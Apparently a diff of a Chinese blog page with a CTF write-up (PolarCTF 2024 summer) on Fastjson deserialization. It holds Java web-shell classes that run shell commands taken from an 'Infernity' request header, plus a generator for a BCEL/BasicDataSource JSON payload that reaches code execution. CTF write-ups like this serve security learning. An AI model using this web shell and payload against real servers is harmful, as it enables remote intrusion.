<span class="operator">=</span> ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();</span><br><span class="line">            String[] cmd =  <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, httprequest.getHeader(<span class="string">&quot;Infernity&quot;</span>)&#125;;  <span class="comment">//请求头加一个Infernity后面加命令</span></span><br><span class="line">            <span class="type">byte</span>[] result = <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(<span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmd).start().getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next().getBytes();</span><br><span class="line">            httpresponse.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(result));</span><br><span class="line">            httpresponse.getWriter().flush();</span><br><span class="line">            httpresponse.getWriter().close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span></span><br><span class="line">            TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator,</span></span><br><span class="line"><span class="params">                          SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.Memshell.fastjson1_nei_chun_ma;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">shell</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">shell</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            org.springframework.web.context.request.<span class="hljs-type">RequestAttributes</span> <span class="hljs-variable">requestAttributes</span> <span class="hljs-operator">=</span> org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();<br>            javax.servlet.http.<span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">httprequest</span> <span class="hljs-operator">=</span> ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();<br>            javax.servlet.http.<span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">httpresponse</span> <span class="hljs-operator">=</span> ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();<br>            String[] cmd =  <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, httprequest.getHeader(<span class="hljs-string">&quot;Infernity&quot;</span>)&#125;;  <span class="hljs-comment">//请求头加一个Infernity后面加命令</span><br>            <span class="hljs-type">byte</span>[] result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.Scanner(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(cmd).start().getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>).next().getBytes();<br>            httpresponse.getWriter().write(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(result));<br>            httpresponse.getWriter().flush();<br>            httpresponse.getWriter().close();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span><br>            TransletException &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator,</span><br><span class="hljs-params">                          SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
-<p><img src="/img/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20241203170049279.png" alt="image-20241203170049279"></p>
+<p><img src="/img/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20241203170049279.png" srcset="/img/loading.gif" lazyload alt="image-20241203170049279"></p>
 <h1 id="FastJsonBCEL"><a href="#FastJsonBCEL" class="headerlink" title="FastJsonBCEL"></a>FastJsonBCEL</h1><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2335078">https://cloud.tencent.com/developer/article/2335078</a></p>
 <p>在<code>/parse</code>路由下存在<code>FastJson</code>解析可能存在反序列化漏洞。</p>
 <p>查看pom.xml</p>
-<p><img src="/img/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20241203193250917.png" alt="image-20241203193250917"></p>
+<p><img src="/img/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20241203193250917.png" srcset="/img/loading.gif" lazyload alt="image-20241203193250917"></p>
 <p>注意到存在<code>tomcat-dbcp</code>依赖和<code>fastjson</code>依赖，且版本分别为<code>9.0.8</code>、 <code>1.2.24</code>。所以可以使用<code>FastJson</code>借助<code>tomcat-dbcp</code>实现BCEL字节码加载的方式。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.Utils.Util;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Util.file2ByteArray(<span class="string">&quot;C:\\Users\\13664\\Documents\\JavaUtils\\target\\classes\\com\\Memshell\\fastjsonBCEL\\shell.class&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(bytes,<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;&#123;\&quot;x\&quot;:&#123;\&quot;@type\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\&quot;driverClassLoader\&quot;:&#123; \&quot;@type\&quot;:\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;&#125;,\&quot;driverClassName\&quot;:\&quot;$$BCEL$$&quot;</span>+code+<span class="string">&quot;\&quot;&#125;&#125;:\&quot;x\&quot;&#125;&quot;</span>;</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;<br><span class="hljs-keyword">import</span> com.Utils.Util;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">byte</span>[] bytes = Util.file2ByteArray(<span class="hljs-string">&quot;C:\\Users\\13664\\Documents\\JavaUtils\\target\\classes\\com\\Memshell\\fastjsonBCEL\\shell.class&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> Utility.encode(bytes,<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&#123;\&quot;x\&quot;:&#123;\&quot;@type\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\&quot;driverClassLoader\&quot;:&#123; \&quot;@type\&quot;:\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;&#125;,\&quot;driverClassName\&quot;:\&quot;$$BCEL$$&quot;</span>+code+<span class="hljs-string">&quot;\&quot;&#125;&#125;:\&quot;x\&quot;&#125;&quot;</span>;<br>        System.out.println(s);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>shell.class：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">shell</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">v0</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">v1</span> <span class="operator">=</span> v0.getMethod(<span class="string">&quot;getRequestAttributes&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">v2</span> <span class="operator">=</span> v1.invoke(<span class="literal">null</span>);</span><br><span class="line">            v0 = Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;org.springframework.web.context.request.ServletRequestAttributes&quot;</span>);</span><br><span class="line">            v1 = v0.getMethod(<span class="string">&quot;getResponse&quot;</span>);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">v3</span> <span class="operator">=</span> v0.getMethod(<span class="string">&quot;getRequest&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">v4</span> <span class="operator">=</span> v1.invoke(v2);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">v5</span> <span class="operator">=</span> v3.invoke(v2);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">v6</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;javax.servlet.ServletResponse&quot;</span>).getDeclaredMethod(<span class="string">&quot;getWriter&quot;</span>);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">v7</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;javax.servlet.http.HttpServletRequest&quot;</span>).getDeclaredMethod(<span class="string">&quot;getHeader&quot;</span>,String.class);</span><br><span class="line">            v7.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            v6.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">v8</span> <span class="operator">=</span> v6.invoke(v4);</span><br><span class="line">            <span class="type">String</span> <span class="variable">v9</span> <span class="operator">=</span> (String) v7.invoke(v5,<span class="string">&quot;Infernity&quot;</span>);      <span class="comment">//请求头传参</span></span><br><span class="line">            String[] v10 = <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">3</span>];</span><br><span class="line">            <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toUpperCase().contains(<span class="string">&quot;WIN&quot;</span>))&#123;</span><br><span class="line">                v10[<span class="number">0</span>] = <span class="string">&quot;cmd&quot;</span>;</span><br><span class="line">                v10[<span class="number">1</span>] = <span class="string">&quot;/c&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                v10[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">                v10[<span class="number">1</span>] = <span class="string">&quot;-c&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            v10[<span class="number">2</span>] = v9;</span><br><span class="line">            v8.getClass().getDeclaredMethod(<span class="string">&quot;println&quot;</span>,String.class).invoke(v8,(<span class="keyword">new</span> <span class="title class_">Scanner</span>(Runtime.getRuntime().exec(v10).getInputStream())).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next());</span><br><span class="line">            v8.getClass().getDeclaredMethod(<span class="string">&quot;flush&quot;</span>).invoke(v8);</span><br><span class="line">            v8.getClass().getDeclaredMethod(<span class="string">&quot;clone&quot;</span>).invoke(v8);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var11) &#123;</span><br><span class="line">            var11.getStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/img/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20241203193423697.png" alt="image-20241203193423697"></p>
-	
-		</div>
-		
-		<div id="current-post-cover" data-scr="/img/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/polarctf.png"></div>
-
-		<!-- relate post, comment...-->
-		<div class="investment-container">
-			<div class="investment-header">
-				<div class="investment-title-1">
-					<div class="on">相关文章</div>
-					<div>评论</div>
-					<div>分享</div>
-				</div>
-				<div class="investment-title-2">	            
-					
-	<span>
-		<a id="totop-post-page">返回顶部</a>
-		
-			<a href="/2024/07/06/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/" title="2024春秋杯部分wp" rel="prev">
-				&laquo;上一篇
-			</a>
-		
-		
-			<a href="/2024/04/30/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" title="PolarCTF2024春季个人挑战赛全wp" rel="next">
-				下一篇&raquo;
-			</a>
-			
-	</span>
-
-
-      		
-				</div>	
-			</div>
-			
-			<div class="investment-content">
-				<div class="investment-content-list">
-					
-
-<div class="relate-post">
-	
-		<ul>
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2025/01/18/xhlj8/" title="第八届西湖论剑初赛web全题解">
-								第八届西湖论剑初赛web全题解			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								一月 18日, 2025				
-							</p>
-							<p class="relate-post-content">
-								Rank-l
-可能是ssti，过滤了一些东西，如果触发过滤，输入密码的页面会直接302
-过滤了空格，用request.args.aaa可以参数逃逸。
-1phone_number=&#123;&#123;url_for.__global...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2025/01/18/xhlj8/" title="第八届西湖论剑初赛web全题解">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/xhlj8/XHLJ8.png" alt="第八届西湖论剑初赛web全题解"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2025/01/14/SUCTF2025/" title="SUCTF 2025 WEB部分wp">
-								SUCTF 2025 WEB部分wp			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								一月 14日, 2025				
-							</p>
-							<p class="relate-post-content">
-								SU_photogallery
-尝试源码泄露 https://www.cnblogs.com/Kawakaze777/p/17799235.html![e0dcf5e1-a150-4c37-bd6e-bf45ea40a99b](img...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2025/01/14/SUCTF2025/" title="SUCTF 2025 WEB部分wp">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/SUCTF2025/SUCTF2025.jpg" alt="SUCTF 2025 WEB部分wp"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/11/09/2024%E9%B9%8F%E5%9F%8E%E6%9D%AFweb%E5%85%A8wp/" title="2024鹏城杯web全wp">
-								2024鹏城杯web全wp			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								十一月 9日, 2024				
-							</p>
-							<p class="relate-post-content">
-								python口算-pcb2024123456789101112131415161718192021222324import requestsimport reurl = &quot;http://192.168.18.28&quot;...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/11/09/2024%E9%B9%8F%E5%9F%8E%E6%9D%AFweb%E5%85%A8wp/" title="2024鹏城杯web全wp">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/background/5.jpg" alt="2024鹏城杯web全wp"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/11/03/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/" title="强网杯2024">
-								强网杯2024			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								十一月 3日, 2024				
-							</p>
-							<p class="relate-post-content">
-								PyBlockly黑名单过滤了所有符号，只能在print里用字母和数字，
-1234if check_for_blacklisted_symbols(block[&#x27;fields&#x27;][&#x27;TEXT&#x27;]...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/11/03/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/" title="强网杯2024">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/qwb2024/qwb2024.png" alt="强网杯2024"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/10/07/SCTF2024/" title="SCTF2024 ezRender">
-								SCTF2024 ezRender			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								十月 7日, 2024				
-							</p>
-							<p class="relate-post-content">
-								ezRender这道题主要是成为admin，要成为admin就要伪造cookie，要伪造cookie就要获取jwt密钥。
-jwt密钥生成逻辑：
-123456789101112131415161718192021import timec...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/10/07/SCTF2024/" title="SCTF2024 ezRender">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/SCTF2024/SCTF2024.jpg" alt="SCTF2024 ezRender"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/09/21/ByteCTF2024%E5%A4%A7%E5%B8%88%E8%B5%9B/" title="ByteCTF2024大师赛web部分wp">
-								ByteCTF2024大师赛web部分wp			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								九月 21日, 2024				
-							</p>
-							<p class="relate-post-content">
-								ezobj源码：
-12345678910111213141516171819&lt;?phpini_set(&quot;display_errors&quot;, &quot;On&quot;);include_once(&quot;...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/09/21/ByteCTF2024%E5%A4%A7%E5%B8%88%E8%B5%9B/" title="ByteCTF2024大师赛web部分wp">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/2024bytectf/bytectf.png" alt="ByteCTF2024大师赛web部分wp"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/09/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AFweb%E5%85%A8%E9%A2%98%E8%A7%A3/" title="第四届长城杯web全题解">
-								第四届长城杯web全题解			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								九月 8日, 2024				
-							</p>
-							<p class="relate-post-content">
-								WEB
-SQLUS
-
-
-
-猜测账户是admin密码是任意一个字符
-登录进去后头像那边，可以上传文件，但是文件名里不能有p，尝试传入.htaccess然后传入一个txt当做php执行。
-
-
-
-在头像前端看到了上传路径
-
-
-flag没有权...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/09/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AFweb%E5%85%A8%E9%A2%98%E8%A7%A3/" title="第四届长城杯web全题解">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/第四届长城杯/ccb.png" alt="第四届长城杯web全题解"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/08/25/NepCTF2024%E9%83%A8%E5%88%86web/" title="NepCTF2024部分web">
-								NepCTF2024部分web			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								八月 25日, 2024				
-							</p>
-							<p class="relate-post-content">
-								NepDouble代码过长这里不贴了，看到上传压缩包的第一反应是做一个链接到&#x2F;flag的软连接，上传上去解压就可以看到flag了，但是这里
-12if os.path.islink(new_file):    return &...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/08/25/NepCTF2024%E9%83%A8%E5%88%86web/" title="NepCTF2024部分web">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/nepctf2024/nepctf2024.png" alt="NepCTF2024部分web"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/08/25/2024%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86wp/" title="2024第七届巅峰极客部分wp">
-								2024第七届巅峰极客部分wp			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								八月 25日, 2024				
-							</p>
-							<p class="relate-post-content">
-								GoldenHornKing源码给了是很明显的ssti，在&#x2F;calc路由里传参calc_req，黑名单是不能有：数字、百分号、非ascii之外的字符。最烦的是这个access，原本是False，可以不用管，但是一旦成功执行一...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/08/25/2024%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86wp/" title="2024第七届巅峰极客部分wp">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/dfjk/dfjk.png" alt="2024第七届巅峰极客部分wp"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/07/06/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/" title="2024春秋杯部分wp">
-								2024春秋杯部分wp			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								七月 6日, 2024				
-							</p>
-							<p class="relate-post-content">
-								brother打开题目是?name&#x3D;hello，还回显了hello，看一下后台语言和框架
-
-一眼ssti模版注入，
-1?name=&#123;&#123;g.pop.__globals__.__builtins__.__im...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/07/06/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/" title="2024春秋杯部分wp">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/2024春秋杯/2024春秋杯.png" alt="2024春秋杯部分wp"/>
-							</a>
-						</div>
-					</li>												
-			
-		</ul>
-	
-</div>	
-				</div>
-				<div class="investment-content-list">
-					<div class="layout-comment">
-
-	
-
-		
-
-			<!-- gitalk comment -->
-			<!-- show gitalk comment -->
-<div id="gitalk-container"></div>
-
-<!-- gitalk`s css & js -->
-<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
-<link rel="stylesheet" href="/css/comment.css">
-<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
-<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
-
-<script type="text/javascript">
-
-	(function gitalkComment(){
-		//Thanks O-R
-		//https://github.com/gitalk/gitalk/issues/102#issuecomment-382970552
-		//去除尾部匹配正则数组的字符串  
-		//Remove redundant characters
-		String.prototype.trimEnd = function(regStr) {
-			let result = this;
-			if(regStr == undefined || regStr == null || regStr == "") {
-				return result;
-			}
-			let array = regStr.split(',');
-
-			if(array.length > 0) {
-
-				let c = array.shift(), 
-					str = this,
-					i = str.length,
-					rg = new RegExp(c),
-					matchArr = str.match(rg);
-
-				if(matchArr != undefined && matchArr != null && matchArr.length > 0) {
-					let matchStr = matchArr[0].replace(/\\/g, "\\\\").replace(/\*/g, "\\*")
-						.replace(/\+/g, "\\+").replace(/\|/g, "\\|")
-						.replace(/\{/g, "\\{").replace(/\}/g, "\\}")
-						.replace(/\(/g, "\\(").replace(/\)/g, "\\)")
-						.replace(/\^/g, "\\^").replace(/\$/g, "\\$")
-						.replace(/\[/g, "\\[").replace(/\]/g, "\\]")
-						.replace(/\?/g, "\\?").replace(/\,/g, "\\,")
-						.replace(/\./g, "\\.").replace(/\&/g, "\\&");
-					matchStr = matchStr + '$';
-					result = str.replace(new RegExp(matchStr), "");
-				}
-
-				if(array.length > 0) {
-					return result.trimEnd(array.join())
-				} else {
-					return result;
-				}
-			}
-		};
-
-		//Create gitalk
-		let gitalk = new Gitalk({
-			clientID: '333--',
-			clientSecret: '333--',
-			//id: window.location.pathname,
-			//id: decodeURI(window.location.pathname),
-			//id: (window.location.pathname).split("/").pop().substring(0, 49),
-			id: decodeURI( md5( location.href.trimEnd('#.*$,\\?.*$,index.html$') ) ),
-			repo: 'annie-gitalk',
-			owner: 'Sariay',
-			admin: 'Sariay',
-			distractionFreeMode: 'true',
-		})
-		gitalk.render('gitalk-container');		
-	})();
-</script>
-
-		
-		
-	
-
-</div>
-				</div>
-				<div class="investment-content-list">
-					<div class="layout-share">
-	
-	
-
-		
-			
-			<!-- socialShare share -->
-			<div class="social-share"></div>
-
-<!--  css & js -->
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
-<script async src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
-			
-		
-		
-	
-</div>
-
-
-				</div>
-			</div>	
-		</div>
-	</div>
-</div>
-
-<!-- show math formula -->
-
-
-
-	 
-	
-<script src="/plugin/clipboard/clipboard.js"></script>
-
-	<script>
-		// Copy code !
-	    function preprocessing() {
-	        $("#article-content .highlight").each(function() {
-	            $(this).wrap('<div id="post-code"></div>');
-	        })
-
-	        $("#article-content #post-code").each(function() {
-	            $(this).prepend('<nav class="copy-nav"><span><i class="code-language"></i></span></nav>');
-	        })
-
-	        $("#article-content .copy-nav").each(function() {
-	            let languageClass = $(this).next().attr('class'),
